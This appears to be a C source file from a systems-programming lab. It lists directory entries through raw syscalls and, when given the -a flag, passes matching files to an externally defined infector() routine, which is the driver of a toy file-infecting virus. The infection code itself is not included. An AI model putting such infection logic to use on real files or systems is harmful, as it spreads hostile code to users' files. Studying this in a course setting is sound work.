#include "util.h"

#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SEEK_SET 0
#define SYS_GETDENTS 141

#define O_CW 101
#define O_RDONLY 0

#define STDIN 0
#define STDOUT 1
#define STDERR 2

enum
  {
    DT_UNKNOWN = 0,
# define DT_UNKNOWN	DT_UNKNOWN
    DT_FIFO = 1,
# define DT_FIFO	DT_FIFO
    DT_CHR = 2,
# define DT_CHR		DT_CHR
    DT_DIR = 4,
# define DT_DIR		DT_DIR
    DT_BLK = 6,
# define DT_BLK		DT_BLK
    DT_REG = 8,
# define DT_REG		DT_REG
    DT_LNK = 10,
# define DT_LNK		DT_LNK
    DT_SOCK = 12,
# define DT_SOCK	DT_SOCK
    DT_WHT = 14
# define DT_WHT		DT_WHT
  };

extern int system_call();
extern void code_start(void);
extern void infection(int);
extern void infector(char *);
extern void code_end(void);

void printRet(int debug, int sysRet, int sys)
{
	if (debug != 0)
	{
		system_call(SYS_WRITE, STDERR, "SysId is ", strlen("SysId is "));
		system_call(SYS_WRITE, STDERR, itoa(sys), (itoa(sys)));
		system_call(SYS_WRITE, STDERR, "\n", 1);
		system_call(SYS_WRITE, STDERR, "Sys Return is ", strlen("Sys return is "));
		system_call(SYS_WRITE, STDERR, itoa(sysRet), (itoa(sysRet)));
		system_call(SYS_WRITE, STDERR, "\n\n", 2);
	}
}

typedef struct ent {
	int inode;
	int offset;
	short len;
	char buf[1];
} ent;

void flame2(int debug, char* prefix, int infect)
{
	unsigned int startAddress = (unsigned int)&code_start;
	unsigned int endAddress = (unsigned int)&code_end;
	system_call(SYS_WRITE, STDOUT, itoa(startAddress), strlen(itoa(startAddress)));
	system_call(SYS_WRITE, STDOUT, "\n", 1);
	system_call(SYS_WRITE, STDOUT, itoa(endAddress), strlen(itoa(endAddress)));
	system_call(SYS_WRITE, STDOUT, "\n\n", 2);
	char buffer[8192];
	ent *entp;
	int count;
	int fd = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
	count = system_call(SYS_GETDENTS, fd, buffer, 8192);
	printRet(debug, fd, SYS_OPEN);
	printRet(debug, count, SYS_GETDENTS);
	int pos;
	for (pos = 0; pos < count;)
	{
		entp = (ent*)(buffer + pos);
		pos += entp->len;
		if (debug == 1)
		{
			system_call(SYS_WRITE, STDERR, "DirEnt name: ", strlen("DirENt name: "));
			system_call(SYS_WRITE, STDERR, entp->buf, strlen(entp->buf));
			system_call(SYS_WRITE, STDERR, "\n", 1);
			system_call(SYS_WRITE, STDERR, "DirEnt len: ", strlen("DirENt nam: "));
			system_call(SYS_WRITE, STDERR, itoa(entp->len), strlen(itoa(entp->len)));
			system_call(SYS_WRITE, STDERR, "\n\n", 2);
		}	
		if (strcmp(entp->buf, "..") == 0 || strcmp(entp->buf, ".") == 0 || strncmp(entp->buf, prefix, strlen(prefix)) != 0)
			continue;
		int sysRet = system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
		system_call(SYS_WRITE, STDOUT, "\n", 1);
		printRet(debug, sysRet, SYS_WRITE);
		char entpType = *(buffer + pos + entp->len - 1);
		char* entpTypeString = (entpType == DT_REG) ?  "regular" :
                                    (entpType == DT_DIR) ?  "directory" :
                                    (entpType == DT_FIFO) ? "FIFO" :
                                    (entpType == DT_SOCK) ? "socket" :
                                    (entpType == DT_LNK) ?  "symlink" :
                                    (entpType == DT_BLK) ?  "block dev" :
                                    (entpType == DT_CHR) ?  "char dev" : "???";
		if (strlen(prefix) > 0)
		{
			system_call(SYS_WRITE, STDOUT, "File type is ", strlen("file type is "));
			sysRet = system_call(SYS_WRITE, STDOUT, entpTypeString, strlen(entpTypeString));
			system_call(SYS_WRITE, STDOUT, "\n", 1);
			printRet(debug, sysRet, SYS_WRITE);
		}
		if (infect == 1)
		{
			infector(entp->buf);
		}
	}
}

int main (int argc , char* argv[])
{
	int debug = 0;
	int infect = 0;
	char* prefix = "\0";
	int i;
	for(i = 1; i < argc; i++)
	{
		if (strncmp(argv[i], "-p", 2) == 0)
			prefix = argv[i] + 2;
		if (strncmp(argv[i], "-a", 2) == 0)
		{
			prefix = argv[i] + 2;
			infect = 1;
		}
		if (strcmp(argv[i], "-D") == 0)
			debug = 1;
	}
	flame2(debug, prefix, infect);
	return 0;
}
